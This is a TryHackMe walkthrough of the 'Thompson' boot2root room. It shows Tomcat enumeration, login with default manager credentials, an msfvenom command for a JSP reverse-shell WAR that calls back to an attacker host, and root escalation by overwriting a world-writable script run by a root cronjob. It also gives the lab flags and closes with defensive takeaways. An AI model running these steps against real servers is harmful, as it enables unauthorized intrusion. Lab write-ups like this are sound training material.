# Thompson - TryHackMe Walkthrough

## 1. Challenge Overview
**Name:** Thompson  
**Category:** Boot2Root / Web / Privilege Escalation  
**Difficulty:** Easy  
**Points/Reward:** N/A  
**Challenge Prompt:** 
> Boot2Root machine for the Thompson room on TryHackMe. Compromise the Tomcat server and escalate privileges to root.

---

## 2. Setup & Enumeration

**Initial Assessment:** 
We are given a target IP of `10.49.165.125`. After some initial local environment troubleshooting with `rustscan`, I pivoted to a standard `nmap` scan to map out the attack surface.

**Reconnaissance Tools:**
```bash
nmap -sC -sV -p 22,8009,8080 10.49.165.125 -oA nmap_deep -v
```

**Terminal Output:**
```text
Discovered open port 8009/tcp on 10.49.165.125
Discovered open port 22/tcp on 10.49.165.125
Discovered open port 8080/tcp on 10.49.165.125
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.5
```

**Secondary Enumeration (Directory Scans, Web Crawling, etc.):**
Knowing that Tomcat is running on port 8080, I fuzz the web directory to look for default admin interfaces or hidden directories.

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.49.165.125:8080/FUZZ
```

**Key Findings:**
* Port 8080 is running Apache Tomcat 8.5.5.
* The `/manager` endpoint is accessible.
* **Credential Discovery**: Navigating to `http://10.49.165.125:8080/manager` triggers a login prompt. By clicking **Cancel**, Tomcat redirects to a 401 Unauthorized page (`manager.html`) which explicitly lists example credentials in the configuration snippet: `tomcat:s3cret`.

---

## 3. Misleading Paths & Failed Attempts
* **Path 1**: Attempted to use `rustscan` for rapid port discovery.
* **Why it failed**: Encountered local AppArmor and snap configuration issues (`snap-confine has elevated permissions`), forcing a switch to traditional `nmap`.
* **Path 2**: Looked into AJP Ghostcat (CVE-2020-1938) for port 8009.
* **Why it failed**: Abandoned this route because deploying a malicious WAR file via the `/manager` interface (using the discovered credentials) is a much more direct path to RCE.

---

## 4. Exploitation & Solution

**The Vulnerability:** 
The application allows access to the Tomcat Manager using discovered credentials. This interface allows for the deployment of `.war` (Web Application Archive) files, which can contain malicious JSP scripts for Remote Command Execution (RCE).

**Step-by-Step Execution:**

1. **Crafting the Payload**:
   We use `msfvenom` to generate a Java JSP reverse shell wrapped in a `.war` file.
    ```bash
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.244.56 LPORT=1234 -f war -o shell.war
    ```

2. **Gaining Initial Access**:
    * Log in to `http://10.49.165.125:8080/manager/html` using `tomcat:s3cret`.
    * Use the **WAR file to deploy** section to upload and deploy `shell.war`.
    * Start a netcat listener: `nc -lvnp 1234`.
    * Trigger the shell by navigating to `http://10.49.165.125:8080/shell/`.

    **Terminal Output:**
    ```text
    connect to [192.168.244.56] from (UNKNOWN) [10.49.165.125] 33184
    whoami
    tomcat
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    tomcat@ubuntu:/$ 
    ```

---

## 5. Post-Exploitation / Privilege Escalation

**Internal Enumeration:**
I checked `/home/jack` for the user flag and uploaded `linpeas.sh` to `/tmp` for further discovery.

**Privilege Escalation to Root/Admin:**
Checking `/etc/crontab` revealed a root cronjob executing a script in a user's home directory:
```bash
*  *    * * *   root    cd /home/jack && bash id.sh
```

Since `id.sh` is world-writable (`-rwxrwxrwx`), we can inject a command to be executed by root. We overwrite the script to copy the root flag to a readable location.

**Terminal Output:**
```bash
tomcat@ubuntu:/home/jack$ echo "cp /root/root.txt /home/jack/root.txt" > id.sh
# Wait 1 minute...
tomcat@ubuntu:/home/jack$ cat root.txt 
d89d5391984c0450a95497153ae7ca3a
```

---

## 6. The Flag

**User Flag:** 
`39400c90bc683a41a8935e4719f181bf`

**Root Flag:** 
`d89d5391984c0450a95497153ae7ca3a`

---

## 7. Takeaways & Conclusion

* **Sensitive Info in Error Pages**: Always check the "Unauthorized" or 404 pages of administrative panels; they often contain default configuration examples or hints.
* **Cronjob Security**: Never run a script as root if it resides in a non-root directory or has weak permissions.
* **Defense**: Remove default users from `tomcat-users.xml`, use strong passwords, and ensure root cronjobs only execute scripts with `root:root` ownership and `744` permissions.
